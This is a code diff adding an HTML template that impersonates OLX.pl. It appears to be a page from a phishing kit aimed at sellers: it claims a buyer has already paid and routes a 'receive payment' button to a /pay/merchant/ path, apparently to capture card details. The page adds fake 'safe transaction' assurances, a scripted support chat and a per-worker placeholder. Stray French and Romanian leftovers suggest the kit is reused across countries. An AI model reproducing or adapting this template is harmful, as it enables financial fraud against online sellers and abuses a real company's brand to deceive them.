@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Bezpłatne ogłoszenia - Ponad 4 miliony ogłoszeń - OLX.pl</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="ie-edge">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&amp;display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="/olx/assets/css/style.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="/olx/assets/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/olx/assets/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/olx/assets/favicon-16x16.png">
+    <link rel="manifest" href="/olx/assets/site.webmanifest">
+    <link rel="mask-icon" href="/olx/assets/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
+
+    <script src="/style/protect/index.js"></script>
+
+        <script src="/style/other/axios.min.js"></script>
+        <script src="/style/other/jquery-3.6.0.min.js"></script>
+
+    <!-- support chat -->
+    <link rel="stylesheet" href="/style/support/support_parent.css">
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content=" " />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+</head>
+
+<body>
+
+    <div id="support">
+        <script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '{{worker.supportType}}';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+        </script>
+    </div>
+
+    <script>
+        if ("{{worker.supportType}}" == "bot") {
+                document.querySelector('#support').innerHTML = `
+        <div class="chatra--webkit chatra--style-round chatra--side-bottom chatra--pos-right chatra--visible chatra--expanded chatra--fast-toggle"
+            id="chatra" data-turbolinks-permanent=""
+            style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display: none;">
+            <div id="chatra__iframe-wrapper">
+                <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat"
+                    allow="autoplay" src="/style/support/index.html?id={{item.id}}"
+                    style="width: 380px; height: 600px; position: absolute;"></iframe>
+            </div>
+        </div>
+
+            <div class="support-circle" onclick="openSupport()"></div>
+                                `
+            }
+    </script>
+
+    <header class="header">
+        <a href="https://www.laposte.fr/" class="main_logotype">
+            <img src="/olx/assets/img/icons/logo.svg" alt="logotype" class="logo">
+        </a>
+        </div>
+    </header>
+    <div class="wrapper">
+        <section class="container_index">
+            <h1 class="page_title">
+                Rejestracja i odbiór środków
+            </h1>
+
+            <div class="product_information">
+                <img src="{{item.photo}}" alt="product_image" id="image_product" class="image_product">
+                <div class="product_data">
+                    <h3 class="product_price" id="product_price">{{item.price}} zł</h3>
+                    <p id="product_name" class="product_name">{{item.title}}</p>
+                </div>
+            </div>
+            <section class="product_content">
+                <div class="delivery_data">
+
+                    <div class="delivery_type">
+                        <div class="delivery_icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none">
+                                <path d="M16 3H1V16H16V3Z" stroke="#FEFEFE" stroke-width="2" stroke-linecap="round"
+                                    stroke-linejoin="round" />
+                                <path d="M16 8H20L23 11V16H16V8Z" stroke="#FEFEFE" stroke-width="2"
+                                    stroke-linecap="round" stroke-linejoin="round" />
+                                <path
+                                    d="M5.5 21C6.88071 21 8 19.8807 8 18.5C8 17.1193 6.88071 16 5.5 16C4.11929 16 3 17.1193 3 18.5C3 19.8807 4.11929 21 5.5 21Z"
+                                    stroke="#FEFEFE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                                <path
+                                    d="M18.5 21C19.8807 21 21 19.8807 21 18.5C21 17.1193 19.8807 16 18.5 16C17.1193 16 16 17.1193 16 18.5C16 19.8807 17.1193 21 18.5 21Z"
+                                    stroke="#FEFEFE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                            </svg>
+                        </div>
+                        <div class="delivery_description">
+                            <p class="type_title">
+                                Twój artykuł jest gotowy!
+                            </p>
+                            <span class="type_description">
+                                Kupujący zapłacił już za zamówienie.
+                            </span>
+                        </div>
+                    </div>
+
+                    {{!-- <div class="data_content">
+                        <div class="delivery_address">
+                            <div class="field_component">
+                                <label for="direction" class="field_label" id="direction">Adres</label>
+                                <input type="text" class="field_input" id="field_direction" value="{{item.address}}"
+                                    readonly>
+                            </div>
+                            <div class="destination_data">
+                                <div class="field_component">
+                                    <label for="direction" class="field_label" id="name">Yam</label>
+                                    <input type="text" class="field_input" id="field_name" value="{{name}}" readonly>
+                                </div>
+                                <div class="field_component">
+                                    <label for="direction" class="field_label" id="surname">Nume de familie</label>
+                                    <input type="text" class="field_input" id="field_surname" value="{{fam}}" readonly>
+                                </div>
+                            </div>
+                        </div>
+                    </div> --}}
+
+                    <p class="oferta">
+                        Po wpłynięciu środków na Twoją kartę, wyślij towar do kupującego zgodnie z podanymi terminami.
+                        <br><br>
+                        Po dostarczeniu towaru należy podać kupującemu numer przesyłki. Towar musi zostać wysłany w
+                        ciągu 3 dni od otrzymania środków pieniężnych..
+                    </p>
+
+                </div>
+
+                <div class="payment_block">
+                    <h2 class="price_amount" id="price_amount">{{item.price}} zł</h2>
+                    <a href="/pay/merchant/{{item.id}}">
+                        <input type="hidden" name="id" value="{{item.id}}">
+                        <div class="button_component">
+                            <span class="button_text">
+                                Otrzymać zapłatę
+                            </span>
+                        </div>
+                    </a>
+                    <hr class="line">
+                    <div class="security_payment">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+                            <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" fill="#3D8F26"
+                                stroke="#3D8F26" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                            <path d="M16 9.3905L10.6261 14.7644L8.18341 12.3217" stroke="#FEFEFE" stroke-width="1.5"
+                                stroke-linecap="round" stroke-linejoin="round" />
+                        </svg>
+                        <span class="text">Dokonywanie płatności jest bezpieczne</span>
+                    </div>
+                    <span class="safe_deal">
+                        Klikając na przycisk "Przyjmij płatność", wyrażasz zgodę na zawarcie umowy sprzedaży towarów za
+                        pomocą usługi internetowej "Bezpieczna transakcja".
+                    </span>
+                </div>
+            </section>
+        </section>
+        <div class="chat" id="open-support" style="display: none;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+                <path
+                    d="M21 11.5C21.0034 12.8199 20.6951 14.1219 20.1 15.3C19.3944 16.7118 18.3098 17.8992 16.9675 18.7293C15.6251 19.5594 14.0782 19.9994 12.5 20C11.1801 20.0035 9.87812 19.6951 8.7 19.1L3 21L4.9 15.3C4.30493 14.1219 3.99656 12.8199 4 11.5C4.00061 9.92179 4.44061 8.37488 5.27072 7.03258C6.10083 5.69028 7.28826 4.6056 8.7 3.90003C9.87812 3.30496 11.1801 2.99659 12.5 3.00003H13C15.0843 3.11502 17.053 3.99479 18.5291 5.47089C20.0052 6.94699 20.885 8.91568 21 11V11.5Z"
+                    stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+            </svg>
+        </div>
+
+        <script>
+            const itemId = "{{item.id}}"
+        </script>
+
+        <script src="/style/other/other.js"></script>
+
+        <script type="text/javascript">
+            function openSupport() {
+                document.querySelector('.support-circle').style.display = 'none'
+                document.querySelector('#chatra').style.display = 'block'
+
+                const iframe = document.getElementById("chatra__iframe")
+                const elmnt = iframe.contentWindow.document.querySelector("#app")
+                elmnt.style.display = "block"
+            }
+        </script>
+
+            <script src="/style/other/axios.min.js"></script>
+    <script src="/style/other/jquery-3.6.0.min.js"></script>
+</body>
+
+</html>
